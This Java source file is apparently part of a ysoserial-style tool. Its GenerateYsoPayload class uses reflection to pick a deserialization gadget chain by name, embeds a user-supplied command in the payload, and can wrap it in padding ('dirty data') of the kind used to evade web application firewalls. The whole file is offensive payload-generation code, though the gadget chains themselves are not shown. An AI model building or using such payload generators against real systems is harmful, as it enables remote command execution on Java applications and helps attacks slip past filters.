package com.ding0x0.yso;

import com.ding0x0.AbsGenerate;
import com.ding0x0.Payload;
import com.ding0x0.yso.payloads.DirtyDataWrapper;
import com.ding0x0.yso.payloads.ObjectPayload;

import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.util.ArrayList;

public class GenerateYsoPayload extends AbsGenerate {

    public String type;
    public String cmd;
    public String dirty;

    public GenerateYsoPayload(String type, String cmd, String dirty) {
        this.cmd = cmd;
        this.type = type;
        this.dirty = dirty;
    }

    @Override
    public Object generatePayload() throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException {
        Class<?> clazz = Class.forName("com.ding0x0.yso.payloads." + this.type);
        ObjectPayload obj = (ObjectPayload) clazz.newInstance();
        Object payload = null;
        try {
            payload = obj.getObject(this.cmd);
            if (this.dirty != null){
                DirtyDataWrapper wrapper = new DirtyDataWrapper(obj,Integer.parseInt(this.dirty));
                payload = wrapper.doWrap();
            }
        }catch (Exception ignore){}
        return new PayloadWrapper(payload);
    }

}
